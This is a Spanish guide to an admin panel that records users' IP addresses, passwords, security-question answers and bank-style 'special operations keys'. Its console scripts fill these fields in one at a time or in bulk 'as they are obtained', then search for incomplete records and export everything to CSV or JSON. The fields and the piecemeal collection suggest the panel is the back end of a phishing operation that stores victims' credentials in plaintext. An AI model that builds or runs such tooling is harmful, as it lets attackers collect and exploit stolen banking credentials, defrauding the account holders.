# 📊 Guía: Actualizar Datos del Historial Progresivamente

Esta guía te enseña cómo actualizar los datos del historial de usuarios conforme se van obteniendo.

## 📋 Nuevas Columnas Implementadas

| # | Columna | Campo en DB | Estado | Descripción |
|---|---------|-------------|--------|-------------|
| 1 | IP | `direccionIP` | ✅ Activo | Dirección IP del usuario |
| 2 | Tipo | `tipo` | ✅ Activo | Tipo de usuario (Persona) |
| 3 | Usuario | `usuario` | ✅ Activo | Nombre de usuario |
| 4 | Clave | `clave` | 🔄 Progresivo | Clave del usuario |
| 5 | Preg. Seg. 1 | `preguntaSeguridad1` | 🔄 Progresivo | Primera pregunta de seguridad |
| 6 | Preg. Seg. 2 | `preguntaSeguridad2` | 🔄 Progresivo | Segunda pregunta de seguridad |
| 7 | Clave Op. Esp. | `claveOperaciones` | 🔄 Progresivo | Clave de operaciones especiales |

---

## 🔧 Cómo Actualizar Datos desde la Consola del Navegador

### **Método 1: Actualizar Campo Individual**

```javascript
// Actualizar solo la clave de un usuario
await actualizarClaveUsuario("juan123", "miClaveSecreta");

// Actualizar pregunta de seguridad 1
await actualizarDatosCompletos("juan123", {
    preguntaSeguridad1: "¿Cuál es el nombre de tu primera mascota?"
});

// Actualizar pregunta de seguridad 2
await actualizarDatosCompletos("juan123", {
    preguntaSeguridad2: "¿En qué ciudad naciste?"
});

// Actualizar clave de operaciones especiales
await actualizarDatosCompletos("juan123", {
    claveOperaciones: "claveOp123"
});
```

### **Método 2: Actualizar Todos los Datos de Una Vez**

```javascript
// Actualizar todos los datos de un usuario
await actualizarDatosCompletos("juan123", {
    clave: "miClaveSecreta",
    preguntaSeguridad1: "¿Cuál es el nombre de tu primera mascota?",
    preguntaSeguridad2: "¿En qué ciudad naciste?",
    claveOperaciones: "claveOp123"
});
```

---

## 📱 Cómo Actualizar desde el Panel de Administración

### **Paso 1: Abrir la Consola del Navegador**
1. Ve al panel de administración
2. Presiona `F12` o `Ctrl+Shift+I`
3. Ve a la pestaña "Console"

### **Paso 2: Ejecutar Comandos**
```javascript
// Ejemplo: Actualizar datos de un usuario específico
await actualizarDatosCompletos("nombreUsuario", {
    clave: "nuevaClave123",
    preguntaSeguridad1: "¿Nombre de tu mascota?",
    preguntaSeguridad2: "¿Ciudad de nacimiento?",
    claveOperaciones: "claveEspecial456"
});
```

### **Paso 3: Verificar Actualización**
- Los datos se actualizarán automáticamente en la tabla
- Verás badges verdes (✓) en lugar de "Pendiente"

---

## 🔄 Actualización Masiva de Usuarios

### **Script para Múltiples Usuarios**

```javascript
// Lista de usuarios con sus datos
const usuariosActualizar = [
    {
        usuario: "juan123",
        clave: "clave123",
        preguntaSeguridad1: "¿Nombre de tu mascota?",
        preguntaSeguridad2: "¿Ciudad natal?",
        claveOperaciones: "opEsp123"
    },
    {
        usuario: "maria456",
        clave: "clave456",
        preguntaSeguridad1: "¿Comida favorita?",
        preguntaSeguridad2: "¿Primer trabajo?",
        claveOperaciones: "opEsp456"
    }
    // Agregar más usuarios aquí...
];

// Función para actualizar todos
async function actualizarTodosLosUsuarios() {
    for (const userData of usuariosActualizar) {
        const { usuario, ...datos } = userData;
        
        console.log(`Actualizando ${usuario}...`);
        
        const exito = await actualizarDatosCompletos(usuario, datos);
        
        if (exito) {
            console.log(`✅ ${usuario} actualizado`);
        } else {
            console.log(`❌ Error actualizando ${usuario}`);
        }
        
        // Pausa de 1 segundo entre actualizaciones
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    console.log("🎉 Actualización masiva completada");
}

// Ejecutar actualización masiva
await actualizarTodosLosUsuarios();
```

---

## 📊 Consultar Datos de Usuarios

### **Obtener Datos de un Usuario Específico**

```javascript
// Obtener todos los registros de un usuario
const datosUsuario = await obtenerDatosUsuarioHistorial("juan123");
console.log(datosUsuario);

// Ver solo los campos principales
datosUsuario.forEach(registro => {
    console.log({
        usuario: registro.usuario,
        clave: registro.clave || 'No definida',
        pregunta1: registro.preguntaSeguridad1 || 'No definida',
        pregunta2: registro.preguntaSeguridad2 || 'No definida',
        claveOp: registro.claveOperaciones || 'No definida'
    });
});
```

### **Buscar Usuarios sin Datos Completos**

```javascript
// Función para encontrar usuarios con datos incompletos
async function usuariosSinDatosCompletos() {
    // Cargar todos los datos del historial
    await cargarHistorial();
    
    const usuariosIncompletos = datosHistorial.filter(item => 
        !item.clave || 
        !item.preguntaSeguridad1 || 
        !item.preguntaSeguridad2 || 
        !item.claveOperaciones
    );
    
    console.log(`📋 Usuarios con datos incompletos: ${usuariosIncompletos.length}`);
    
    usuariosIncompletos.forEach(usuario => {
        console.log({
            usuario: usuario.usuario,
            faltaClave: !usuario.clave,
            faltaPregunta1: !usuario.preguntaSeguridad1,
            faltaPregunta2: !usuario.preguntaSeguridad2,
            faltaClaveOp: !usuario.claveOperaciones
        });
    });
    
    return usuariosIncompletos;
}

// Ejecutar búsqueda
await usuariosSinDatosCompletos();
```

---

## 🎯 Visualización en el Panel

### **Estados de los Datos:**
- **✓ (Badge Verde)**: Dato disponible
- **Pendiente (Badge Gris)**: Dato no disponible aún

### **Columnas Mostradas:**
1. **IP**: Dirección IP del usuario
2. **Tipo**: Tipo de usuario (badge azul)
3. **Usuario**: Nombre en negrita
4. **Clave**: Estado de la clave
5. **Preg. Seg. 1**: Estado de primera pregunta
6. **Preg. Seg. 2**: Estado de segunda pregunta
7. **Clave Op. Esp.**: Estado de clave de operaciones
8. **Fecha**: Fecha de registro
9. **Hora**: Hora de registro

---

## 📥 Exportación de Datos

### **CSV Incluye:**
- Todos los campos principales
- Campos técnicos (timestamp, card color, etc.)
- Datos completos para análisis

### **JSON Incluye:**
- Estructura completa de datos
- Metadatos de actualización
- Timestamps de modificaciones

---

## ⚠️ Notas Importantes

### **Seguridad:**
- Las claves se almacenan como texto plano
- Considera encriptar datos sensibles
- Limita acceso al panel de administración

### **Performance:**
- Las actualizaciones masivas pueden ser lentas
- Usa pausas entre actualizaciones
- Monitorea el uso de Firestore

### **Backup:**
- Exporta datos antes de actualizaciones masivas
- Mantén respaldos regulares
- Documenta cambios importantes

---

## 🔧 Solución de Problemas

### **Error: "actualizarDatosCompletos is not defined"**
- Asegúrate de estar en el panel de administración
- Recarga la página y vuelve a intentar

### **Error: "Permission denied"**
- Verifica las reglas de Firestore
- Asegúrate de tener permisos de escritura

### **Los datos no se actualizan en la tabla**
- La tabla se actualiza automáticamente
- Si no se actualiza, recarga manualmente con el botón "Actualizar"

---

## ✅ Checklist de Actualización

- [ ] ✅ Datos de usuario identificados
- [ ] ✅ Comando de actualización preparado
- [ ] ✅ Consola del navegador abierta
- [ ] ✅ Comando ejecutado exitosamente
- [ ] ✅ Datos verificados en la tabla
- [ ] ✅ Exportación probada (opcional)

---

**¡Con esta guía puedes actualizar progresivamente todos los datos del historial conforme los vayas obteniendo!**
